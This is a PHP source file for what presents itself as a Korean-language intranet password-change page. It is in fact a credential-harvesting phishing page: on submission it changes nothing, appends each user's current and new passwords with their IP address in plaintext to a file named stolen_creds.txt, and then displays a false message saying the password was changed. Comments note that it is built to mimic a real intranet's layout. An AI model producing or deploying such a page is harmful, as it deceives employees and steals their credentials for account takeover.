<?php
$done = false;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $current_pw = (string)($_POST['current_password'] ?? '');
    $new_pw     = (string)($_POST['new_password'] ?? '');
    $new_pw_confirm = (string)($_POST['new_password_confirm'] ?? '');

    if ($current_pw !== '' && $new_pw !== '' && $new_pw === $new_pw_confirm) {
        $log_data = sprintf(
            "[%s] IP: %s | CurrentPW: %s | NewPW: %s\n",
            date('Y-m-d H:i:s'),
            $_SERVER['REMOTE_ADDR'],
            $current_pw,
            $new_pw
        );
        file_put_contents(__DIR__ . '/stolen_creds.txt', $log_data, FILE_APPEND | LOCK_EX);
    }
    $done = true;
}

$page_title  = '비밀번호 변경';
$active_menu = '';
// 실제 인트라넷 환경이라면 아래 헤더/푸터를 포함하여 공통 스타일과 레이아웃을 맞춥니다.
// require __DIR__ . '/includes/header.php';
?>

<!-- 실제 인트라넷 스타일과 구조에 맞춘 HTML -->
<div class="topbar"><h1>비밀번호 변경</h1></div>

<div class="card" style="max-width:420px;">
    <?php if ($done): ?>
        <p style="color:var(--accent); font-size:13px; margin-bottom:16px;">비밀번호가 변경되었습니다.</p>
    <?php endif; ?>

    <form method="post" action="">
        <div class="form-group">
            <label for="current_password">현재 비밀번호</label>
            <input type="password" id="current_password" name="current_password"
                   autocomplete="current-password" required>
        </div>
        <div class="form-group">
            <label for="new_password">새 비밀번호</label>
            <input type="password" id="new_password" name="new_password"
                   autocomplete="new-password" required>
        </div>
        <div class="form-group">
            <label for="new_password_confirm">새 비밀번호 확인</label>
            <input type="password" id="new_password_confirm" name="new_password_confirm"
                   autocomplete="new-password" required>
        </div>
        <button type="submit" class="btn btn-primary">비밀번호 변경</button>
    </form>
</div>

<?php 
// require __DIR__ . '/includes/footer.php'; 
?>
